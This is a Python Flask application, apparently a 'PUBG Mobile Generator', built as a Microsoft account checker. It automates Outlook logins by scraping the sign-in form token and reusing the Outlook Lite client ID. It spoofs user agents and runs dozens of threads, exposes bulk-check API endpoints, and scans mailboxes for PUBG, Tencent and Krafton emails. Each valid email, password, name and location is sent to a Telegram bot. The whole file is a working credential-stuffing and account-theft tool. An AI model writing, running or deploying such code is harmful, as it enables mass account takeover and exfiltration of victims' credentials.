import os
import re
import json
import uuid
import random
import time
import hashlib
import requests
from flask import Flask, request, jsonify, render_template_string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import string

app = Flask(__name__)

# API Konfigürasyonu
CONFIG = {
    "telegram_token": os.environ.get("TELEGRAM_TOKEN"),
    "telegram_chat_id": os.environ.get("TELEGRAM_CHAT_ID"),
    "max_workers": 30,
    "timeout": 20,
    "retry_count": 3,
    "generate_count": 50
}

# İstatistikler
stats = {
    "total_generated": 0,
    "valid_accounts": 0,
    "pubg_mobile_accounts": 0,
    "bad_accounts": 0,
    "email_details": {},
    "start_time": None,
    "last_check": None,
    "generated_accounts": []
}

# PUBG Mobile gönderici adresleri
TARGET_SENDERS = [
    "noreply@pubgmobile.com",
    "no-reply@pubgmobile.com",
    "pubgmobile@news.pubg.com",
    "pubgmobile@info.pubg.com",
    "pubgmobile@promotions.pubg.com",
    "pubgmobile@events.pubg.com",
    "tencentgames.com",
    "levelinfinite.com",
    "krafton.com"
]

# Güçlü User-Agent listesi
USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_headers():
    return {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"'
    }

def generate_random_account():
    """Rastgele gerçekçi hesap oluşturur"""
    # Rastgele isimler
    first_names = ["Ahmet", "Mehmet", "Ali", "Hasan", "Hüseyin", "Mustafa", "İbrahim", "Muhammet", "Eren", "Deniz", 
                   "Emir", "Yusuf", "Omar", "Kerem", "Burak", "Cem", "Can", "Efe", "Mert", "Kaan",
                   "Zeynep", "Elif", "Ayşe", "Fatma", "Hatice", "Sena", "Merve", "Busra", "Melisa", "Irem"]
    last_names = ["Demir", "Yılmaz", "Kaya", "Çelik", "Şahin", "Aydın", "Öztürk", "Kılıç", "Arslan", "Doğan",
                  "Yıldız", "Aksoy", "Kaplan", "Polat", "Kurt", "Atalay", "Yavuz", "Güneş", "Kara", "Akçay"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    
    # Rastgele doğum tarihi (18-40 yaş arası)
    year = random.randint(1984, 2006)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    birth_date = f"{year}-{month:02d}-{day:02d}"
    
    # Rastgele Türkçe karakterlerle email oluştur
    chars = string.ascii_lowercase + string.digits
    username_length = random.randint(6, 12)
    username = ''.join(random.choice(chars) for _ in range(username_length))
    
    # Email domainleri
    domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com", "icloud.com"]
    email = f"{username}@{random.choice(domains)}"
    
    # Güçlü şifre oluştur
    password_chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choice(password_chars) for _ in range(random.randint(10, 16)))
    
    # Rastgele ülkeler
    countries = ["Türkiye", "USA", "UK", "Germany", "France", "Italy", "Spain", "Russia", "Japan", "South Korea"]
    country = random.choice(countries)
    
    # Rastgele telefon numarası
    phone = f"+90{random.randint(500, 599)}{random.randint(1000000, 9999999)}"
    
    return {
        "email": email,
        "password": password,
        "first_name": first_name,
        "last_name": last_name,
        "full_name": f"{first_name} {last_name}",
        "birth_date": birth_date,
        "country": country,
        "phone": phone,
        "created_at": datetime.now().isoformat()
    }

def generate_facebook_style_account():
    """Facebook tarzı hesap oluşturur"""
    chars = "1234567890QWERTYUIOPASDFGHJKLXCVBNM"
    us = ''.join(random.choice(chars) for _ in range(7))
    username = "GE" + us
    password = "BF" + us
    us4 = ''.join(random.choice(chars) for _ in range(8))
    
    return {
        "email": f"{username}@gmail.com",
        "password": f"+{us4}",
        "username": username,
        "full_name": f"User {username[:5]}",
        "country": "Türkiye",
        "phone_code": "+90",
        "created_at": datetime.now().isoformat()
    }

def check_microsoft_account(email, password):
    """Microsoft hesabını kontrol eder ve token alır"""
    try:
        session = requests.Session()
        session.headers.update(get_random_headers())
        
        # 1. Authorize isteği
        params = {
            "client_info": "1",
            "haschrome": "1",
            "login_hint": email,
            "mkt": "en",
            "response_type": "code",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
        }
        
        response = session.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize",
            params=params
        )
        
        if response.status_code != 200:
            return None, None, False
        
        html = response.text
        
        # PPFT al
        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html)
        if not ppft_match:
            return None, None, False
        
        ppft = ppft_match.group(1)
        
        # URL Post al
        url_post_match = re.search(r"urlPost:'([^']+)'", html)
        if not url_post_match:
            return None, None, False
        
        url_post = url_post_match.group(1)
        cookies = response.cookies.get_dict()
        
        # 2. Login isteği
        login_data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft}&PPSX=PassportR&type=11&LoginOptions=1"
        
        login_headers = {
            "Host": "login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": get_random_user_agent(),
            "Cookie": "; ".join([f"{k}={v}" for k, v in cookies.items()])
        }
        
        login_response = session.post(
            url_post,
            data=login_data,
            headers=login_headers,
            allow_redirects=False
        )
        
        # 3. Token al
        location = login_response.headers.get('Location', '')
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return None, None, False
            
        code = code_match.group(1)
        cid = cookies.get('MSPCID', '').upper()
        
        # 4. Access token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        token_response = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        token_json = token_response.json()
        access_token = token_json.get("access_token")
        
        if access_token:
            return access_token, cid, True
        else:
            return None, None, False
            
    except Exception as e:
        print(f"Microsoft kontrol hatası {email}: {str(e)}")
        return None, None, False

def check_pubg_emails(email, password, token, cid):
    """PUBG Mobile maillerini kontrol eder"""
    try:
        headers = {
            "User-Agent": get_random_user_agent(),
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate"
        }
        
        # Profil bilgileri
        profile_response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=CONFIG["timeout"]
        )
        profile_data = profile_response.json() if profile_response.status_code == 200 else {}
        
        name = "Bilinmiyor"
        location = "Bilinmiyor"
        if profile_data.get('names'):
            name = profile_data['names'][0].get('displayName', 'Bilinmiyor')
        if profile_data.get('accounts'):
            location = profile_data['accounts'][0].get('location', 'Bilinmiyor')
        
        # Outlook startup data
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        startup_headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": cid,
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": get_random_user_agent(),
            "action": "StartupData",
            "x-owa-correlationid": cid,
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        
        startup_response = requests.post(
            url,
            headers=startup_headers,
            data="",
            timeout=CONFIG["timeout"]
        )
        
        response_text = startup_response.text if startup_response.status_code == 200 else ""
        
        # PUBG Mobile maillerini say
        domain_counts = {}
        total_count = 0
        
        for sender in TARGET_SENDERS:
            count = response_text.count(sender)
            if count > 0:
                domain_counts[sender] = count
                total_count += count
        
        return {
            "is_valid": True,
            "has_pubg": total_count > 0,
            "name": name,
            "location": location,
            "total_count": total_count,
            "domain_counts": domain_counts
        }
        
    except Exception as e:
        return {
            "is_valid": False,
            "error": str(e)
        }

def generate_and_check_accounts(count=50):
    """Hesap üretir ve kontrol eder"""
    global stats
    
    results = []
    accounts_to_check = []
    
    # Hesap üret
    print(f"🔄 {count} hesap üretiliyor...")
    for i in range(count):
        account = generate_facebook_style_account()
        accounts_to_check.append(account)
        stats["total_generated"] += 1
    
    print(f"✅ {len(accounts_to_check)} hesap üretildi, kontrol ediliyor...")
    
    # Thread pool ile kontrol et
    with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = []
        for account in accounts_to_check:
            futures.append(executor.submit(check_single_account, account))
        
        for i, future in enumerate(futures):
            try:
                result = future.result(timeout=CONFIG["timeout"] + 5)
                results.append(result)
                
                # Telegram'a gönder
                if result.get("status") == "valid" and result.get("has_pubg", False):
                    send_telegram_message(result)
                
                # İlerleme göster
                if (i + 1) % 10 == 0:
                    print(f"📊 {i+1}/{len(accounts_to_check)} hesap kontrol edildi")
                    
            except Exception as e:
                results.append({"error": str(e)})
                print(f"❌ Kontrol hatası: {str(e)}")
    
    # İstatistikleri güncelle
    valid_count = sum(1 for r in results if r.get("status") == "valid")
    pubg_count = sum(1 for r in results if r.get("status") == "valid" and r.get("has_pubg", False))
    bad_count = sum(1 for r in results if r.get("status") != "valid")
    
    stats["valid_accounts"] += valid_count
    stats["pubg_mobile_accounts"] += pubg_count
    stats["bad_accounts"] += bad_count
    stats["last_check"] = datetime.now().isoformat()
    stats["generated_accounts"] = results
    
    return results

def check_single_account(account):
    """Tek bir hesabı kontrol eder"""
    email = account.get("email")
    password = account.get("password")
    
    if not email or not password:
        return {
            "status": "invalid",
            "error": "Email or password missing"
        }
    
    # Microsoft hesabını kontrol et
    token, cid, is_valid = check_microsoft_account(email, password)
    
    if not is_valid or not token:
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": "Microsoft login failed"
        }
    
    # PUBG maillerini kontrol et
    result = check_pubg_emails(email, password, token, cid)
    
    if result.get("is_valid", False):
        return {
            "status": "valid",
            "email": email,
            "password": password,
            "has_pubg": result.get("has_pubg", False),
            "name": result.get("name", "Bilinmiyor"),
            "location": result.get("location", "Bilinmiyor"),
            "total_pubg_mails": result.get("total_count", 0),
            "domain_counts": result.get("domain_counts", {})
        }
    else:
        return {
            "status": "invalid",
            "email": email,
            "password": password,
            "reason": "Check failed",
            "error": result.get("error", "Unknown error")
        }

def send_telegram_message(result):
    """Telegram'a mesaj gönderir"""
    if not CONFIG["telegram_token"] or not CONFIG["telegram_chat_id"]:
        return
    
    try:
        email = result.get("email")
        password = result.get("password")
        name = result.get("name", "Bilinmiyor")
        location = result.get("location", "Bilinmiyor")
        total_count = result.get("total_pubg_mails", 0)
        domain_counts = result.get("domain_counts", {})
        
        domain_lines = []
        for sender, count in domain_counts.items():
            domain = sender.split('@')[-1] if '@' in sender else sender
            domain_lines.append(f"├ {domain}: {count} mail")
        
        domain_text = "\n".join(domain_lines) if domain_lines else "├ PUBG Mail bulunamadı"
        
        message = f"""✅ PUBG MOBILE HESAP BULUNDU!

📧 Email: {email}
🔑 Şifre: {password}
👤 İsim: {name}
📍 Ülke: {location}
📬 Toplam PUBG Mail: {total_count}

📊 Mail Dağılımı:
{domain_text}

📞✈️ Telegram: @rinexdestek
        
🆕 Hesap otomatik oluşturuldu ve kontrol edildi
📅 Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
"""
        
        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
        data = {
            "chat_id": CONFIG["telegram_chat_id"],
            "text": message,
            "parse_mode": "HTML"
        }
        
        requests.post(url, data=data, timeout=5)
        print(f"📨 Telegram mesajı gönderildi: {email}")
        
    except Exception as e:
        print(f"❌ Telegram hatası: {str(e)}")

def generate_html_page():
    """HTML sayfasını oluşturur"""
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile Account Generator API</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a; 
            color: #fff; 
            padding: 20px;
            background-image: radial-gradient(circle at 10% 20%, rgba(255, 215, 0, 0.05) 0%, transparent 50%);
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        .header {
            text-align: center;
            padding: 40px 20px;
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border-radius: 16px;
            margin-bottom: 30px;
            border: 1px solid #333;
            position: relative;
            overflow: hidden;
        }
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.03), transparent);
            animation: rotate 20s linear infinite;
        }
        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }
        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            position: relative;
            z-index: 1;
        }
        .header p {
            color: #888;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            background: linear-gradient(135deg, #1a1a1a, #222);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid #333;
            transition: transform 0.3s, border-color 0.3s;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            border-color: #ffd700;
        }
        .stat-box .number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .stat-box .label {
            color: #888;
            font-size: 13px;
        }
        .stat-box.gold .number { color: #ffd700; }
        .stat-box.green .number { color: #00ff88; }
        .stat-box.blue .number { color: #0088ff; }
        .stat-box.red .number { color: #ff0044; }
        
        .section {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
        }
        .section h2 {
            color: #ffd700;
            margin-bottom: 15px;
            font-size: 22px;
        }
        .endpoint {
            background: #111;
            padding: 15px 20px;
            border-radius: 8px;
            margin: 10px 0;
            border-left: 3px solid #ffd700;
        }
        .endpoint .method {
            color: #ffd700;
            font-weight: bold;
            margin-right: 10px;
        }
        .endpoint code {
            color: #00ff88;
            background: #000;
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 14px;
        }
        .endpoint .desc {
            color: #888;
            margin-top: 5px;
            font-size: 14px;
        }
        .endpoint .badge {
            display: inline-block;
            padding: 2px 12px;
            border-radius: 12px;
            font-size: 11px;
            margin-left: 10px;
        }
        .badge.public { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .badge.auth { background: #0088ff22; color: #0088ff; border: 1px solid #0088ff; }
        .badge.admin { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        
        .example {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            overflow-x: auto;
        }
        .example code {
            color: #00ff88;
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        
        .account-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .account-item {
            padding: 10px 15px;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
        }
        .account-item:hover {
            background: #222;
        }
        .account-item .email { color: #00ff88; }
        .account-item .pass { color: #ffd700; }
        .account-item .status {
            padding: 2px 10px;
            border-radius: 10px;
            font-size: 11px;
        }
        .status.valid { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
        .status.pubg { background: #ffd70022; color: #ffd700; border: 1px solid #ffd700; }
        .status.invalid { background: #ff004422; color: #ff0044; border: 1px solid #ff0044; }
        
        .footer {
            text-align: center;
            padding: 30px;
            color: #555;
            border-top: 1px solid #222;
            margin-top: 30px;
        }
        .footer a {
            color: #ffd700;
            text-decoration: none;
        }
        
        .btn {
            display: inline-block;
            padding: 10px 25px;
            border-radius: 8px;
            border: none;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffd700, #ff6b00);
            color: #000;
        }
        .btn-primary:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
        }
        .btn-success {
            background: #00ff88;
            color: #000;
        }
        .btn-success:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            color: #888;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0a0a0a;
            color: #fff;
            font-size: 14px;
        }
        .form-group input:focus {
            outline: none;
            border-color: #ffd700;
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        @media (max-width: 600px) {
            .form-row { grid-template-columns: 1fr; }
            .header h1 { font-size: 32px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 PUBG Mobile Generator API</h1>
            <p>Otomatik Hesap Üretme • Kontrol • Bildirim</p>
            <p style="font-size: 12px; color: #444; margin-top: 10px;">Krafton • Tencent • Level Infinite • PUBG Mobile</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-box gold">
                <div class="number">{{ stats.total_generated }}</div>
                <div class="label">Toplam Üretilen</div>
            </div>
            <div class="stat-box green">
                <div class="number">{{ stats.valid_accounts }}</div>
                <div class="label">✅ Geçerli Hesap</div>
            </div>
            <div class="stat-box blue">
                <div class="number">{{ stats.pubg_mobile_accounts }}</div>
                <div class="label">🎮 PUBG Mobile</div>
            </div>
            <div class="stat-box red">
                <div class="number">{{ stats.bad_accounts }}</div>
                <div class="label">❌ Başarısız</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🚀 Hızlı Başlat</h2>
            <div class="form-row">
                <div class="form-group">
                    <label>Hesap Sayısı</label>
                    <input type="number" id="accountCount" value="10" min="1" max="100">
                </div>
                <div class="form-group" style="display: flex; align-items: flex-end;">
                    <button class="btn btn-primary" onclick="generateAccounts()" style="width: 100%;">
                        ⚡ Hesapları Üret ve Kontrol Et
                    </button>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>📡 API Endpoints</h2>
            
            <div class="endpoint">
                <span class="method">GET</span> <code>/</code>
                <span class="badge public">Public</span>
                <div class="desc">Ana sayfa - API dokümantasyonu</div>
            </div>
            
            <div class="endpoint">
                <span class="method">GET</span> <code>/api/status</code>
                <span class="badge public">Public</span>
                <div class="desc">API durumu ve istatistikler</div>
            </div>
            
            <div class="endpoint">
                <span class="method">POST</span> <code>/api/generate</code>
                <span class="badge auth">Auth</span>
                <div class="desc">Hesap üret ve kontrol et</div>
                <div class="example">
                    <code>POST /api/generate<br>
                    {<br>
                    &nbsp;&nbsp;"count": 10<br>
                    }</code>
                </div>
            </div>
            
            <div class="endpoint">
                <span class="method">POST</span> <code>/api/check-single</code>
                <span class="badge auth">Auth</span>
                <div class="desc">Tek bir hesabı kontrol et</div>
                <div class="example">
                    <code>POST /api/check-single<br>
                    {<br>
                    &nbsp;&nbsp;"email": "user@example.com",<br>
                    &nbsp;&nbsp;"password": "password123"<br>
                    }</code>
                </div>
            </div>
            
            <div class="endpoint">
                <span class="method">POST</span> <code>/api/check-bulk</code>
                <span class="badge auth">Auth</span>
                <div class="desc">Birden fazla hesabı kontrol et</div>
                <div class="example">
                    <code>POST /api/check-bulk<br>
                    {<br>
                    &nbsp;&nbsp;"accounts": [<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;{"email": "user1@example.com", "password": "pass1"},<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;{"email": "user2@example.com", "password": "pass2"}<br>
                    &nbsp;&nbsp;]<br>
                    }</code>
                </div>
            </div>
            
            <div class="endpoint">
                <span class="method">POST</span> <code>/api/config</code>
                <span class="badge admin">Admin</span>
                <div class="desc">Konfigürasyon güncelleme</div>
            </div>
        </div>
        
        {% if stats.generated_accounts %}
        <div class="section">
            <h2>📋 Son Üretilen Hesaplar</h2>
            <div class="account-list">
                {% for acc in stats.generated_accounts[:20] %}
                <div class="account-item">
                    <span>
                        <span class="email">{{ acc.get('email', 'N/A') }}</span>
                        <span style="color: #555;">|</span>
                        <span class="pass">{{ acc.get('password', 'N/A') }}</span>
                    </span>
                    <div>
                        {% if acc.get('status') == 'valid' %}
                            {% if acc.get('has_pubg', False) %}
                                <span class="status pubg">🎮 PUBG</span>
                            {% else %}
                                <span class="status valid">✅ Geçerli</span>
                            {% endif %}
                        {% else %}
                            <span class="status invalid">❌ Geçersiz</span>
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        
        <div class="footer">
            <p>📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></p>
            <p style="font-size: 12px; margin-top: 10px;">PUBG Mobile Account Generator • v2.0</p>
        </div>
    </div>
    
    <script>
        function generateAccounts() {
            const count = document.getElementById('accountCount').value || 10;
            
            fetch('/api/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ count: parseInt(count) })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(`✅ ${data.generated} hesap üretildi ve kontrol edildi!\n🎮 PUBG Mobile: ${data.pubg_count}`);
                    location.reload();
                } else {
                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                }
            })
            .catch(error => {
                alert('❌ Bağlantı hatası: ' + error);
            });
        }
    </script>
</body>
</html>
    """

@app.route('/')
def index():
    return render_template_string(generate_html_page(), stats=stats)

@app.route('/api/status', methods=['GET'])
def status():
    uptime = None
    if stats["start_time"]:
        uptime = str(datetime.now() - stats["start_time"])
    
    return jsonify({
        "status": "online",
        "uptime": uptime,
        "stats": {
            "total_generated": stats["total_generated"],
            "valid_accounts": stats["valid_accounts"],
            "pubg_mobile_accounts": stats["pubg_mobile_accounts"],
            "bad_accounts": stats["bad_accounts"],
            "last_check": stats["last_check"]
        },
        "config": {
            "max_workers": CONFIG["max_workers"],
            "timeout": CONFIG["timeout"],
            "telegram_configured": bool(CONFIG["telegram_token"] and CONFIG["telegram_chat_id"])
        }
    })

@app.route('/api/generate', methods=['POST'])
def generate_accounts():
    try:
        data = request.get_json() or {}
        count = data.get('count', CONFIG["generate_count"])
        
        if count < 1:
            return jsonify({"error": "Count must be at least 1"}), 400
        if count > 100:
            return jsonify({"error": "Count cannot exceed 100"}), 400
        
        # Hesap üret ve kontrol et
        results = generate_and_check_accounts(count)
        
        pubg_accounts = [r for r in results if r.get("status") == "valid" and r.get("has_pubg", False)]
        
        return jsonify({
            "success": True,
            "generated": len(results),
            "valid_count": sum(1 for r in results if r.get("status") == "valid"),
            "pubg_count": len(pubg_accounts),
            "bad_count": sum(1 for r in results if r.get("status") != "valid"),
            "accounts": results[:20],
            "message": f"{len(pubg_accounts)} PUBG Mobile hesabı bulundu!"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-single', methods=['POST'])
def check_single():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({"error": "email and password required"}), 400
        
        account = {"email": email, "password": password}
        result = check_single_account(account)
        
        # İstatistikleri güncelle
        if result.get("status") == "valid":
            stats["valid_accounts"] += 1
            if result.get("has_pubg", False):
                stats["pubg_mobile_accounts"] += 1
        else:
            stats["bad_accounts"] += 1
        
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "result": result
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-bulk', methods=['POST'])
def check_bulk():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        accounts = data.get('accounts', [])
        if not accounts:
            return jsonify({"error": "accounts list required"}), 400
        
        if len(accounts) > 50:
            return jsonify({"error": "Maximum 50 accounts per request"}), 400
        
        results = []
        with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
            futures = [executor.submit(check_single_account, acc) for acc in accounts]
            for future in futures:
                try:
                    result = future.result(timeout=CONFIG["timeout"] + 5)
                    results.append(result)
                    
                    if result.get("status") == "valid":
                        stats["valid_accounts"] += 1
                        if result.get("has_pubg", False):
                            stats["pubg_mobile_accounts"] += 1
                    else:
                        stats["bad_accounts"] += 1
                        
                except Exception as e:
                    results.append({"error": str(e)})
                    stats["bad_accounts"] += 1
        
        stats["last_check"] = datetime.now().isoformat()
        
        return jsonify({
            "success": True,
            "total": len(results),
            "valid_count": sum(1 for r in results if r.get("status") == "valid"),
            "pubg_count": sum(1 for r in results if r.get("status") == "valid" and r.get("has_pubg", False)),
            "results": results
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/config', methods=['POST'])
def update_config():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        if 'telegram_token' in data:
            CONFIG["telegram_token"] = data["telegram_token"]
        if 'telegram_chat_id' in data:
            CONFIG["telegram_chat_id"] = data["telegram_chat_id"]
        if 'max_workers' in data:
            CONFIG["max_workers"] = min(int(data["max_workers"]), 50)
        if 'timeout' in data:
            CONFIG["timeout"] = min(int(data["timeout"]), 60)
        
        return jsonify({
            "success": True,
            "config": {
                "telegram_configured": bool(CONFIG["telegram_token"] and CONFIG["telegram_chat_id"]),
                "max_workers": CONFIG["max_workers"],
                "timeout": CONFIG["timeout"]
            }
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/stats/reset', methods=['POST'])
def reset_stats():
    global stats
    stats = {
        "total_generated": 0,
        "valid_accounts": 0,
        "pubg_mobile_accounts": 0,
        "bad_accounts": 0,
        "email_details": {},
        "start_time": datetime.now(),
        "last_check": None,
        "generated_accounts": []
    }
    return jsonify({"success": True, "message": "İstatistikler sıfırlandı"})

if __name__ == "__main__":
    stats["start_time"] = datetime.now()
    
    # Environment variable'lardan konfigürasyon
    CONFIG["telegram_token"] = os.environ.get("TELEGRAM_TOKEN")
    CONFIG["telegram_chat_id"] = os.environ.get("TELEGRAM_CHAT_ID")
    
    port = int(os.environ.get("PORT", 5000))
    
    print("🎯 PUBG Mobile Generator API Başlatılıyor...")
    print("=" * 50)
    print(f"📡 Port: {port}")
    print(f"⚡ Max Workers: {CONFIG['max_workers']}")
    print(f"⏱️  Timeout: {CONFIG['timeout']}s")
    print(f"📱 Telegram: {'✅ Aktif' if CONFIG['telegram_token'] and CONFIG['telegram_chat_id'] else '❌ Pasif'}")
    print(f"🔄 Otomatik Üretim: {CONFIG['generate_count']} hesap")
    print("📞✈️ Telegram: @rinexdestek")
    print("=" * 50)
    
    app.run(host="0.0.0.0", port=port, debug=False)
